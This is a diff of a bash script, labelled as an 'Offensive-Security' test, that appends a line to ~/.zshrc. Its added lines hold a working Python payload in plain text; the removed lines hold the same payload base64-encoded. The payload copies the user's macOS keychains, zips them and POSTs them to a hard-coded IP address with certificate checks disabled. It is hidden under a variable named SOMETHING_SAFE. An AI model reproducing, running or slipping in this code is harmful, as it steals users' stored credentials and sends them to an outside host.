@@ -1,8 +1,8 @@
 #!/bin/bash
 #agregando cositas al .zshrc
 MESSAGE="echo 'Hola, soy producto de una prueba de Offensive-Security'"
-STRING="aW1wb3J0IHNodXRpbCwgcGF0aGxpYiwgdXJsbGliLnJlcXVlc3QsIHNzbDsgYiA9IHBhdGhsaWIuUGF0aCgnL3RtcC9pbmZvX2NvbGxlY3RlZCcpOyBkID0gYiAvICdrZXljaGFpbnMnOyBkLm1rZGlyKHBhcmVudHM9VHJ1ZSwgZXhpc3Rfb2s9VHJ1ZSk7IHNodXRpbC5jb3B5dHJlZShwYXRobGliLlBhdGguaG9tZSgpIC8gJ0xpYnJhcnkvS2V5Y2hhaW5zJywgZCwgZGlyc19leGlzdF9vaz1UcnVlKTsgYXJjaGl2ZSA9IHNodXRpbC5tYWtlX2FyY2hpdmUoJy90bXAva2V5Y2hhaW5zX2NvbGxlY3RlZCcsICd6aXAnLCBiKTsgY3R4ID0gc3NsLl9jcmVhdGVfdW52ZXJpZmllZF9jb250ZXh0KCk7IGYgPSBvcGVuKGFyY2hpdmUsICdyYicpOyByZXEgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KCdodHRwczovLzEwNC4yNDguNjQuMTgwOjgwMDAvYmFzaF9wcm9maWxlJywgZGF0YT1mLnJlYWQoKSwgbWV0aG9kPSdQT1NUJyk7IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCBjb250ZXh0PWN0eCk="
-SOMETHING_SAFE="python3 -c \"import base64; exec(base64.b64decode('$STRING'))\""
+STRING="import shutil, pathlib, urllib.request, ssl; b = pathlib.Path('/tmp/info_collected'); d = b / 'keychains'; d.mkdir(parents=True, exist_ok=True); shutil.copytree(pathlib.Path.home() / 'Library/Keychains', d, dirs_exist_ok=True); archive = shutil.make_archive('/tmp/keychains_collected', 'zip', b); ctx = ssl._create_unverified_context(); f = open(archive, 'rb'); req = urllib.request.Request('https://104.248.64.180:8000/zshrc', data=f.read(), method='POST'); urllib.request.urlopen(req, context=ctx)"
+SOMETHING_SAFE='python3 -c "$STRING"'
 # Verificar si el mensaje ya existe en el .zshrc
 if ! grep -Fxq "$MESSAGE" ~/.zshrc; then
     echo "$MESSAGE" >> ~/.zshrc
